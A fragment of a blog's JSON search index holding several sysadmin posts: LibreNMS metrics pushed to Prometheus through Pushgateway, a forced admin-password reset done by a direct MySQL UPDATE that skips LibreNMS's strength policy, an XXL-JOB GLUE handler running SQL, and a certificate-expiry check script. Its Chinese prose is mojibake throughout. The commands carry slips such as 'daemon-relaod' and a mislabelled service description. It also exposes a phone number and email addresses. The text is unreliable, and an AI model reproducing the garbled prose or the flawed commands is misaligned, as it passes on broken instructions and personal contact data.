config.php $config[\u0026#39;prometheus\u0026#39;][\u0026#39;enable\u0026#39;] = true; $config[\u0026#39;prometheus\u0026#39;][\u0026#39;url\u0026#39;] = \u0026#39;http://127.0.0.1:50004\u0026#39;; $config[\u0026#39;prometheus\u0026#39;][\u0026#39;job\u0026#39;] = \u0026#39;librenms\u0026#39;; # Optional ä¸‰ã€é…ç½®prometheus\n- job_name: \u0026#39;librenms\u0026#39; scrape_interval: 300s honor_labels: true static_configs: - targets: [\u0026#39;172.18.31.10:50004\u0026#39;] labels: sms_to: \u0026#39;18618197196\u0026#39; é¦–å…ˆè®¿é—®prometheusï¼Œhttp://172.18.31.8:9090/targets\nè¿™æ ·å¼„å¥½åï¼Œå†è®¿é—® http://172.18.31.10:50004/metrics\né‡Œé¢çš„ä¸œè¥¿æ˜¯ååˆ†ç™«ç‹‚çš„ï¼Œä»äº¤æ¢æœºç«¯å£åˆ°F5ï¼Œåº”æœ‰å°½æœ‰\nä¸œè¥¿æ”¶è¿›prometheusåï¼Œå¯ä»¥é€šè¿‡grafanaå¯¹å„ç§æŒ‡æ ‡è¿›è¡Œç”»å›¾å’ŒæŠ¥è­¦\n","permalink":"https://rendoumi.com/posts/20231213-librenms_prometheus/","summary":"\u003cp\u003elibrenmsæ˜¯ä¸ªéå¸¸å¼ºæ‚çš„å·¥å…·ï¼Œå¯¹ç½‘ç»œä¸æ¸…æ¥šçš„å¯ä»¥é€è¿‡è¿™ä¸ªå·¥å…·ï¼Œå¯¹ç½‘ç»œç¯å¢ƒæœ‰æ¸…æ™°çš„äº†è§£ã€‚\u003c/p\u003e\n\u003cp\u003eå¦‚ä½•é€šè¿‡prometheuså¯¹librenmsè¿›è¡Œé›†æˆå‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eä¸€ã€è£…pushgateway\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://github.com/prometheus/pushgateway/releases/download/v1.2.0/pushgateway-1.2.0.linux-amd64.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eæŠŠpushgatewayæ”¾åˆ°/usr/local/bin\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt; EOF \u0026gt;\u0026gt;/etc/systemd/system/pushgateway.service \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[Unit]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eDescription=Codis Exporter\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eWants=network-online.target\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eAfter=network-online.target\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[Service]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eType=simple\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eExecStart=/usr/local/bin/pushgateway --web.listen-address=:50004\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[Install]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eWantedBy=multi-user.target\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl daemon-relaod\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e --now pushgateway.service\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eäºŒã€é…ç½®librenms\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /opt/librenms\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi config.php\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;prometheus\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e][\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;enable\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e true\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;prometheus\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e][\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;url\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;http://127.0.0.1:50004\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;prometheus\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e][\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;job\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;librenms\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"c1\"\u003e# Optional\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸‰ã€é…ç½®prometheus\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- job_name: \u003cspan class=\"s1\"\u003e\u0026#39;librenms\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  scrape_interval: 300s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  honor_labels: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  static_configs:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    - targets: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;172.18.31.10:50004\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      labels:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        sms_to: \u003cspan class=\"s1\"\u003e\u0026#39;18618197196\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé¦–å…ˆè®¿é—®prometheusï¼Œhttp://172.18.31.8:9090/targets\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231213-librenms_prometheus/2020-07-02_152912.png\"\u003e\u003c/p\u003e\n\u003cp\u003eè¿™æ ·å¼„å¥½åï¼Œå†è®¿é—® http://172.18.31.10:50004/metrics\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231213-librenms_prometheus/2020-07-02_152550.png\"\u003e\u003c/p\u003e\n\u003cp\u003eé‡Œé¢çš„ä¸œè¥¿æ˜¯ååˆ†ç™«ç‹‚çš„ï¼Œä»äº¤æ¢æœºç«¯å£åˆ°F5ï¼Œåº”æœ‰å°½æœ‰\u003c/p\u003e\n\u003cp\u003eä¸œè¥¿æ”¶è¿›prometheusåï¼Œå¯ä»¥é€šè¿‡grafanaå¯¹å„ç§æŒ‡æ ‡è¿›è¡Œç”»å›¾å’ŒæŠ¥è­¦\u003c/p\u003e","title":"Librenmsé›†æˆè¿›prometheus"},{"content":"librenmså¯¹å¯†ç çš„å¼ºåº¦æœ‰è¦æ±‚ï¼Œå¿…é¡»ä½¿ç”¨éå¸¸å¤æ‚çš„å¯†ç ç­–ç•¥æ‰èƒ½æ»¡è¶³è¦æ±‚. è¿™å°±é¬¼ç•œäº†ï¼Œæƒ³æ”¹æˆè‡³å°‘èƒ½è®°å¾—ä½çš„å¯†ç ã€‚\nå¦‚ä½•å¼ºåˆ¶ä¿®æ”¹å‘¢ï¼Ÿ\né¦–å…ˆå¼„ä¸€æ®µphpç¨‹åºæ¥ç”ŸæˆåŠ å¯†ä¸²ï¼š\n\u0026lt;?php\recho password_hash(\u0026quot;xxxxxxxx\u0026quot;, PASSWORD_DEFAULT);\r?\u0026gt;\rè¿è¡Œåå¾—åˆ°åŠ å¯†çš„å­—ç¬¦ä¸²ï¼š\n$2y$10$EUvwg5kVGXQUPBw4obdPJ.AKCSVgu8ximyyoFKW7hXed0s.sh/ud6\ræˆ–è€…ç›´æ¥åˆ°ä¸‹é¢çš„ç½‘ç«™æ¥ç”Ÿæˆï¼š\nhttps://phppasswordhash.com/\nç„¶åç™»å½•librenmsçš„æœºå™¨, 172.18.31.10\nmysql -uroot -p\ruse librenms;\rselect * from users;\rupdate users set password='$2y$10$EUvwg5kVGXQUPBw4obdPJ.AKCSVgu8ximyyoFKW7hXed0s.sh/ud6' where user_id=1;\rè¿™æ ·å°±å¼ºåˆ¶æŠŠå¯†ç ä¿®æ”¹æˆè‡ªå·±ä¹ æƒ¯çš„äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20231213-librenms_password/","summary":"\u003cp\u003elibrenmså¯¹å¯†ç çš„å¼ºåº¦æœ‰è¦æ±‚ï¼Œå¿…é¡»ä½¿ç”¨éå¸¸å¤æ‚çš„å¯†ç ç­–ç•¥æ‰èƒ½æ»¡è¶³è¦æ±‚. è¿™å°±é¬¼ç•œäº†ï¼Œæƒ³æ”¹æˆè‡³å°‘èƒ½è®°å¾—ä½çš„å¯†ç ã€‚\u003c/p\u003e\n\u003cp\u003eå¦‚ä½•å¼ºåˆ¶ä¿®æ”¹å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆå¼„ä¸€æ®µphpç¨‹åºæ¥ç”ŸæˆåŠ å¯†ä¸²ï¼š\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e\u0026lt;?php\r\necho password_hash(\u0026quot;xxxxxxxx\u0026quot;, PASSWORD_DEFAULT);\r\n?\u0026gt;\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eè¿è¡Œåå¾—åˆ°åŠ å¯†çš„å­—ç¬¦ä¸²ï¼š\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e$2y$10$EUvwg5kVGXQUPBw4obdPJ.AKCSVgu8ximyyoFKW7hXed0s.sh/ud6\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eæˆ–è€…ç›´æ¥åˆ°ä¸‹é¢çš„ç½‘ç«™æ¥ç”Ÿæˆï¼š\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://phppasswordhash.com/\"\u003ehttps://phppasswordhash.com/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åç™»å½•librenmsçš„æœºå™¨, 172.18.31.10\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003emysql -uroot -p\r\nuse librenms;\r\nselect * from users;\r\nupdate users set password='$2y$10$EUvwg5kVGXQUPBw4obdPJ.AKCSVgu8ximyyoFKW7hXed0s.sh/ud6' where user_id=1;\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eè¿™æ ·å°±å¼ºåˆ¶æŠŠå¯†ç ä¿®æ”¹æˆè‡ªå·±ä¹ æƒ¯çš„äº†ã€‚\u003c/p\u003e","title":"Librenmså¼ºåˆ¶ä¿®æ”¹å¯†ç "},{"content":"æ•°æ®åº“ç®¡ç†å‘˜æœ‰ä¸ªç‰¹æ®Šçš„éœ€æ±‚ï¼š\néœ€è¦ä¸€ä¸ªmsyqlå®¢æˆ·ç«¯ï¼Œå¯ä»¥å®šæ—¶å»è¿æ¥mysqlæœåŠ¡å™¨æ‰§è¡ŒSQLè¯­å¥ã€‚ä¸”å¯ä»¥è‡ªå·±åŠ¨æ€ç¼–è¾‘SQLè¯­å¥ã€‚\næ‰¾æ¥æ‰¾å»ï¼Œæ•°æ®åº“ç®¡ç†å‘˜å¯¹spring javaè¿™ç±»ä¸œè¥¿å§ä¸€æ— æ‰€çŸ¥ï¼Œä½†æ˜¯é€šæ™“SQLï¼Œè¿™ç§æƒ…å½¢XXL-JOBçš„EXECUTORä»£ä½æ‰§è¡Œå°±æ¯”è¾ƒé€‚åˆã€‚\nä¸»æ§åœ°å€ï¼šhttp://172.18.31.13/xxl-job-admin/\nä½¿ç”¨å¾ˆç®€å•ï¼Œæˆ‘ä»¬åœ¨172.18.31.14è£…ä¸€ä¸ªè¢«æ§ç«¯çš„executorï¼Œè¿è¡Œæ¨¡å¼é€‰æ‹©GLUE(Java)æ¨¡å¼ï¼ŒGLUEæ¨¡å¼å°±å¯ä»¥éšä¾¿ç¼–è¾‘ JAVA+SQLæºä»£ç äº†ã€‚è®¾ç½®æ‰§è¡Œé¢‘ç‡æ˜¯æ¯30åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ã€‚\né€‰æ‹©GLUEæ¨¡å¼åï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨GLUE IDEé‡Œç¼–è¾‘ä»£ç ï¼š\nä»£ç å¦‚ä¸‹ï¼š æ³¨ï¼šåœ¨172.18.31.14ä¸Šé¢å·²ç»è£…äº†ä¸€ä¸ªMySQLæœåŠ¡ç«¯ï¼Œæœ‰ä¸€ä¸ªuseråº“ã€‚\npackage com.xxl.job.service.handler;\rimport com.xxl.job.core.context.XxlJobHelper;\rimport com.xxl.job.core.handler.IJobHandler;\rimport org.springframework.jdbc.core.JdbcTemplate;\rimport org.springframework.jdbc.datasource.DriverManagerDataSource;\rpublic class DemoGlueJobHandler extends IJobHandler {\r@Override\rpublic void execute() throws Exception {\rDriverManagerDataSource ds = new DriverManagerDataSource();\rds.setDriverClassName(\u0026#34;com.mysql.jdbc.Driver\u0026#34;);\rds.setUrl(\u0026#34;jdbc:mysql://localhost:3306/users?characterEncoding=UTF-8\u0026amp;useSSL=false\u0026#34;);\rds.setUsername(\u0026#34;root\u0026#34;);\rds.setPassword(\u0026#34;xxxxxxxx\u0026#34;);\rJdbcTemplate jdbcTemplate = new JdbcTemplate();\rjdbcTemplate.setDataSource(ds);\rList rows = jdbcTemplate.queryForList(\u0026#34;select * from user\u0026#34;); Iterator it = rows.iterator(); while(it.hasNext()) { Map userMap = (Map) it.next(); XxlJobHelper.log(userMap.get(\u0026#34;id\u0026#34;) + \u0026#34;\\t\u0026#34;); XxlJobHelper.log(userMap.get(\u0026#34;name\u0026#34;) + \u0026#34;\\t\u0026#34;); } XxlJobHelper.log(\u0026#34;XXL-JOB guning, Hello World.\u0026#34;);\r}\r} ä¸ºäº†å®ç°mysqlå®¢æˆ·ç«¯å¯ä»¥å¯¹MySQLè¿›è¡Œè¯»å†™ï¼Œæˆ‘ä»¬éœ€è¦åœ¨xxl-jobçš„xxl-job-executor-sample-springbootç¤ºä¾‹é¡¹ç›®ä¸­ï¼Œpom.xmlä¸­å¢åŠ spring-jdbcå’Œmysql-connector-javaçš„jaråŒ…éƒ¨åˆ†ã€‚æ‰“å‡ºä¸€ä¸ªxxl-jobçš„executorçš„æ‰§è¡Œç«¯ç¨‹åºã€‚\nä»£ç åœ¨ /root/xxl-job-2.3.0/xxl-job-executor-samples/xxl-job-executor-sample-springbootç›®å½•ä¸‹ï¼Œç”¨mvn packageå°±å¯ä»¥æ‰“å‡ºxxl-job-executor-sample-springboot-2.3.0.jaråŒ…ã€‚\n\u0026lt;dependency\u0026gt;\r\u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt;\r\u0026lt;artifactId\u0026gt;spring-jdbc\u0026lt;/artifactId\u0026gt;\r\u0026lt;version\u0026gt;4.3.2.RELEASE\u0026lt;/version\u0026gt;\r\u0026lt;/dependency\u0026gt;\r\u0026lt;dependency\u0026gt;\r\u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt;\r\u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt;\r\u0026lt;version\u0026gt;${mysql-connector-java.version}\u0026lt;/version\u0026gt;\r\u0026lt;/dependency\u0026gt; å¯åŠ¨agentçš„systemdæœåŠ¡è„šæœ¬ï¼Œ/etc/systemd/system/xxljob-agent.service\n[Unit] After=network.target Wants=network.target [Service] WorkingDirectory=/usr/local/bin\rType=simple ExecStart=/usr/bin/java -jar /usr/local/bin/xxl-job-executor-sample-springboot-2.3.0.jar\rRestart=on-failure [Install] WantedBy=multi-user.target è¿™æ ·å°±OKäº†ã€‚\n","permalink":"https://rendoumi.com/posts/20231212-xxl-job/","summary":"\u003cp\u003eæ•°æ®åº“ç®¡ç†å‘˜æœ‰ä¸ªç‰¹æ®Šçš„éœ€æ±‚ï¼š\u003c/p\u003e\n\u003cp\u003eéœ€è¦ä¸€ä¸ªmsyqlå®¢æˆ·ç«¯ï¼Œå¯ä»¥å®šæ—¶å»è¿æ¥mysqlæœåŠ¡å™¨æ‰§è¡ŒSQLè¯­å¥ã€‚ä¸”å¯ä»¥è‡ªå·±åŠ¨æ€ç¼–è¾‘SQLè¯­å¥ã€‚\u003c/p\u003e\n\u003cp\u003eæ‰¾æ¥æ‰¾å»ï¼Œæ•°æ®åº“ç®¡ç†å‘˜å¯¹spring javaè¿™ç±»ä¸œè¥¿å§ä¸€æ— æ‰€çŸ¥ï¼Œä½†æ˜¯é€šæ™“SQLï¼Œè¿™ç§æƒ…å½¢XXL-JOBçš„EXECUTORä»£ä½æ‰§è¡Œå°±æ¯”è¾ƒé€‚åˆã€‚\u003c/p\u003e\n\u003cp\u003eä¸»æ§åœ°å€ï¼šhttp://172.18.31.13/xxl-job-admin/\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231212-xxl-job/2022-02-07_091252.png\"\u003e\u003c/p\u003e\n\u003cp\u003eä½¿ç”¨å¾ˆç®€å•ï¼Œæˆ‘ä»¬åœ¨172.18.31.14è£…ä¸€ä¸ªè¢«æ§ç«¯çš„executorï¼Œè¿è¡Œæ¨¡å¼é€‰æ‹©GLUE(Java)æ¨¡å¼ï¼ŒGLUEæ¨¡å¼å°±å¯ä»¥éšä¾¿ç¼–è¾‘ JAVA+SQLæºä»£ç äº†ã€‚è®¾ç½®æ‰§è¡Œé¢‘ç‡æ˜¯æ¯30åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231212-xxl-job/2022-02-07_091351.png\"\u003e\u003c/p\u003e\n\u003cp\u003eé€‰æ‹©GLUEæ¨¡å¼åï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨GLUE IDEé‡Œç¼–è¾‘ä»£ç ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231212-xxl-job/2022-02-07_091558.png\"\u003e\u003c/p\u003e\n\u003cp\u003eä»£ç å¦‚ä¸‹ï¼š\næ³¨ï¼šåœ¨172.18.31.14ä¸Šé¢å·²ç»è£…äº†ä¸€ä¸ªMySQLæœåŠ¡ç«¯ï¼Œæœ‰ä¸€ä¸ªuseråº“ã€‚\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003epackage com.xxl.job.service.handler;\r\n\r\nimport com.xxl.job.core.context.XxlJobHelper;\r\nimport com.xxl.job.core.handler.IJobHandler;\r\nimport org.springframework.jdbc.core.JdbcTemplate;\r\nimport org.springframework.jdbc.datasource.DriverManagerDataSource;\r\n\r\npublic class DemoGlueJobHandler extends IJobHandler {\r\n\r\n\t@Override\r\n\tpublic void execute() throws Exception {\r\n\r\n        DriverManagerDataSource ds = new DriverManagerDataSource();\r\n        ds.setDriverClassName(\u0026#34;com.mysql.jdbc.Driver\u0026#34;);\r\n        ds.setUrl(\u0026#34;jdbc:mysql://localhost:3306/users?characterEncoding=UTF-8\u0026amp;useSSL=false\u0026#34;);\r\n        ds.setUsername(\u0026#34;root\u0026#34;);\r\n        ds.setPassword(\u0026#34;xxxxxxxx\u0026#34;);\r\n\r\n        JdbcTemplate jdbcTemplate = new JdbcTemplate();\r\n        jdbcTemplate.setDataSource(ds);\r\n      \r\n\r\n        List rows = jdbcTemplate.queryForList(\u0026#34;select * from user\u0026#34;); \r\n        Iterator it = rows.iterator(); \r\n        while(it.hasNext()) { \r\n            Map userMap = (Map) it.next(); \r\n            XxlJobHelper.log(userMap.get(\u0026#34;id\u0026#34;) + \u0026#34;\\t\u0026#34;); \r\n            XxlJobHelper.log(userMap.get(\u0026#34;name\u0026#34;) + \u0026#34;\\t\u0026#34;); \r\n        } \r\n      \r\n        XxlJobHelper.log(\u0026#34;XXL-JOB guning, Hello World.\u0026#34;);\r\n\t}\r\n\r\n  \r\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eä¸ºäº†å®ç°mysqlå®¢æˆ·ç«¯å¯ä»¥å¯¹MySQLè¿›è¡Œè¯»å†™ï¼Œæˆ‘ä»¬éœ€è¦åœ¨xxl-jobçš„xxl-job-executor-sample-springbootç¤ºä¾‹é¡¹ç›®ä¸­ï¼Œpom.xmlä¸­å¢åŠ spring-jdbcå’Œmysql-connector-javaçš„jaråŒ…éƒ¨åˆ†ã€‚æ‰“å‡ºä¸€ä¸ªxxl-jobçš„executorçš„æ‰§è¡Œç«¯ç¨‹åºã€‚\u003c/p\u003e","title":"xxl-jobçš„åŠ¨æ€ç¼–è¾‘å¹¶æ‰§è¡Œjavaè„šæœ¬"},{"content":"è¯ä¹¦ä¼šç»å¸¸é¢ä¸´è¿‡æœŸè€Œæ²¡æœ‰åŠæ—¶ç»­è´¹çš„æƒ…å†µï¼Œå†™ä¸ªè„šæœ¬æé†’ä¸€ä¸‹è‡ªå·±å§ï¼š\ncrontab -l\n0 8 * * * /usr/local/bin/check_ssl.sh www.ddky.com\rcheck_ssl.shçš„å†…å®¹ï¼š\n#!/bin/bash # Print the number of days till certificate expiration # # Example: # $ check_cert.sh sleeplessbeastie.eu # 81 # $ check_cert.sh lwn.net # 630 # # Exit codes: # 0 - certificate is not expired # 1 - certificate is expired # 254 - certificate is empty # 255 - DNS resolution failed # # temporary file to store certificate certificate_file=$(mktemp) # delete temporary file on exit trap \u0026#34;unlink $certificate_file\u0026#34; EXIT if [ \u0026#34;$#\u0026#34; -eq \u0026#34;1\u0026#34; ]; then website=\u0026#34;$1\u0026#34; host \u0026#34;$website\u0026#34; \u0026gt;\u0026amp;- if [ \u0026#34;$?\u0026#34; -eq \u0026#34;0\u0026#34; ]; then echo -n | openssl s_client -servername \u0026#34;$website\u0026#34; -connect \u0026#34;$website\u0026#34;:443 2\u0026gt;/dev/null | sed -ne \u0026#39;/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p\u0026#39; \u0026gt; $certificate_file certificate_size=$(stat -c \u0026#34;%s\u0026#34; $certificate_file) if [ \u0026#34;$certificate_size\u0026#34; -gt \u0026#34;1\u0026#34; ]; then date=$(openssl x509 -in $certificate_file -enddate -noout | sed \u0026#34;s/.*=\\(.*\\)/\\1/\u0026#34;) date_s=$(date -d \u0026#34;${date}\u0026#34; +%s) now_s=$(date -d now +%s) date_diff=$(( (date_s - now_s) / 86400 )) echo \u0026#34;$date_diff\u0026#34; if [ \u0026#34;$date_diff\u0026#34; -le 37 ]; then /usr/local/bin/mailsend -q -to \u0026#34;zhangranrui@ddky.com\u0026#34; -from monit@ddky.com -ssl -port 465 -auth -auth-plan -smtp smtp.exmail.qq.com -sub \u0026#34;è¯ä¹¦å°±è¦åˆ°æœŸäº†\u0026#34; -v -user \u0026#34;monit@ddky.com\u0026#34; -pass \u0026#34;xxxxxxxx\u0026#34; -cs \u0026#34;utf-8\u0026#34; -enc-type \u0026#34;base64\u0026#34; -M \u0026#34;$website è¿˜æœ‰ $date_diff å¤©å°±è¦åˆ°æœŸäº†ï¼ï¼ï¼\u0026#34; fi if [ \u0026#34;$date_s\u0026#34; -gt \u0026#34;$now_s\u0026#34; ]; then exit 0 # ok else exit 1 # not ok fi else exit 254 fi else exit 255 fi fi ","permalink":"https://rendoumi.com/posts/20231212-check_ssl/","summary":"\u003cp\u003eè¯ä¹¦ä¼šç»å¸¸é¢ä¸´è¿‡æœŸè€Œæ²¡æœ‰åŠæ—¶ç»­è´¹çš„æƒ…å†µï¼Œå†™ä¸ªè„šæœ¬æé†’ä¸€ä¸‹è‡ªå·±å§ï¼š\u003c/p\u003e\n\u003cp\u003ecrontab -l\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e0 8 * * * /usr/local/bin/check_ssl.sh www.ddky.com\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003echeck_ssl.shçš„å†…å®¹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\u003cspan class=\"c1\"\u003e# Print the number of days till certificate expiration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Example:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#   $ check_cert.sh sleeplessbeastie.eu\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#   81\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#   $ check_cert.sh 